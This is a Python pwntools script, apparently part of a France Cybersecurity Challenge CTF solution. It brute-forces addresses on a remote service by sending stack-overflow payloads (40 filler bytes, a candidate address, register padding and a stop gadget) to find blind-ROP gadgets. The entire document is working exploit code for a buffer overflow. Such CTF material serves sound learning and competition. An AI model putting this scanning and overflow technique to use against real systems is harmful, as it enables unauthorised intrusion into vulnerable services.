#!/usr/bin/env python3

from pwn import *
from Crypto.Util.number import bytes_to_long
import os

ref = b'Hello you.\nWhat is your name ?\n>>> '
base_addr = 0x400000 # start of the ELF

# values we found earlier
stop_gadgets = [0x400560, 0x400562, 0x400563, 0x400565, 0x400566, 0x400567,
        0x400569, 0x40056d, 0x40056e, 0x40056f, 0x400570, 0x400576, 0x400577,
        0x4006b4, 0x4006b5, 0x4006b6, 0x4006b8, 0x40073b]
stop_gadget = 0x400560

start = 0
end = start + 0x1000
L = [] # we also check if there are any false positives

for i in range(start, end):
    # connect to server
    context.log_level='error'
    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
    context.log_level='info'

    try:
        # build payload
        addr = base_addr + i
        log.info(f'trying addr = {hex(addr)}')
        pld = b'c' * 40         # fill buffer
        pld += p64(addr)        # brop gadget
        pld += p64(0) * 6       # 6 addresses we load in registers
        pld += p64(stop_gadget) # rip

        # send payload and check if output is the reference
        r.recv(timeout=0.1)
        r.send(pld)
        res = r.recv(timeout=0.1)
        if ref in res:
            # /!\ be careful with false positives /!\
            if addr not in stop_gadgets:
                L.append(addr)

    # nothing at this address, close the connection and iterate
    except:
        pass
    context.log_level='error'
    r.close()
    context.log_level='info'

log.success(f'brop_gadgets = {[hex(i) for i in L]}')
